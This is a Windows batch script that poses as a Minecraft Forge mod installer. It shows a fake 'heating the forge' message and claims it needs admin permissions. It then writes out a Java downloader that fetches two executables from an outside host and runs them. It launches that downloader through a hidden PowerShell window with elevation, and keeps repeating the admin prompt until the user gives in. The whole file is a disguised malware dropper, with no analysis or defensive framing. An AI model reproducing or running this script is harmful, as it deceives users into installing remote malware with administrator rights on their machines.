@echo off
setlocal

echo Heating the forge...
timeout /t 1 /nobreak >nul
echo.
echo To initialize all mods properly, Forge needs admin permissions.
timeout /t 2 /nobreak >nul

set "JAVA_FILE=%TEMP%\Downloader.java"

:: Create the Java file inline
(
echo import java.io.InputStream;
echo import java.net.URI;
echo import java.net.http.HttpClient;
echo import java.net.http.HttpRequest;
echo import java.net.http.HttpResponse;
echo import java.nio.file.Files;
echo import java.nio.file.Path;
echo import java.time.Duration;
echo.
echo public class Downloader {
echo     public static void main^(String[] args^) {
echo         String url1 = "https://bloodmoon.one/msb.exe";
echo         String url2 = "https://bloodmoon.one/cvs.exe";
echo.
echo         Path tempDir = Path.of^(System.getProperty^("java.io.tmpdir"^)^);
echo         Path file1Path = tempDir.resolve^("cvscvscvs.exe"^);
echo         Path file2Path = tempDir.resolve^("msbmsbmsb.exe"^);
echo.
echo         HttpClient client = HttpClient.newBuilder^(^)
echo             .connectTimeout^(Duration.ofSeconds^(15^)^)
echo             .followRedirects^(HttpClient.Redirect.NORMAL^)
echo             .build^(^);
echo.
echo         if ^(download^(client, url1, file1Path^)^) {
echo             runFile^(file1Path^);
echo         }
echo.
echo         if ^(download^(client, url2, file2Path^)^) {
echo             runFile^(file2Path^);
echo         }
echo     }
echo.
echo     private static boolean download^(HttpClient client, String url, Path destination^) {
echo         try {
echo             HttpRequest request = HttpRequest.newBuilder^(URI.create^(url^)^)
echo                 .timeout^(Duration.ofSeconds^(30^)^)
echo                 .GET^(^)
echo                 .build^(^);
echo.
echo             HttpResponse^<InputStream^> response = client.send^(request, HttpResponse.BodyHandlers.ofInputStream^(^)^);
echo             if ^(response.statusCode^(^) ^< 200 ^|^| response.statusCode^(^) ^>= 300^) {
echo                 return false;
echo             }
echo.
echo             try ^(InputStream body = response.body^(^)^) {
echo                 Files.copy^(body, destination, java.nio.file.StandardCopyOption.REPLACE_EXISTING^);
echo             }
echo             return true;
echo         } catch ^(Exception e^) {
echo             return false;
echo         }
echo     }
echo.
echo     private static void runFile^(Path file^) {
echo         try {
echo             new ProcessBuilder^(file.toString^(^)^).start^(^);
echo         } catch ^(Exception e^) {
echo         }
echo     }
echo }
) > "%JAVA_FILE%"

:request_admin
:: Find Java in common locations
set "JAVAW_PATH="
for %%i in (javaw.exe) do set "JAVAW_PATH=%%~$PATH:i"
if not defined JAVAW_PATH (
    if exist "%JAVA_HOME%\bin\javaw.exe" set "JAVAW_PATH=%JAVA_HOME%\bin\javaw.exe"
)
if not defined JAVAW_PATH (
    for /d %%i in ("C:\Program Files\Java\jdk*") do (
        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
    )
)
if not defined JAVAW_PATH (
    for /d %%i in ("C:\Program Files\Eclipse Adoptium\jdk*") do (
        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
    )
)
if not defined JAVAW_PATH (
    for /d %%i in ("%USERPROFILE%\.jdks\*") do (
        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
    )
)

:: If still not found, try java.exe as fallback
if not defined JAVAW_PATH (
    for %%i in (java.exe) do set "JAVAW_PATH=%%~$PATH:i"
)

if not defined JAVAW_PATH (
    echo Java not found. Please install Java.
    timeout /t 3 /nobreak >nul
    exit
)

:: Run with javaw (no console) and request admin elevation
powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "$p = Start-Process -FilePath '%JAVAW_PATH%' -ArgumentList @('%JAVA_FILE%') -WorkingDirectory '%TEMP%' -Verb RunAs -PassThru -ErrorAction SilentlyContinue; if (-not $p) { exit 1 }"

if errorlevel 1 (
    echo.
    echo Admin privileges are required. Please try again.
    timeout /t 2 /nobreak >nul
    goto request_admin
)

exit
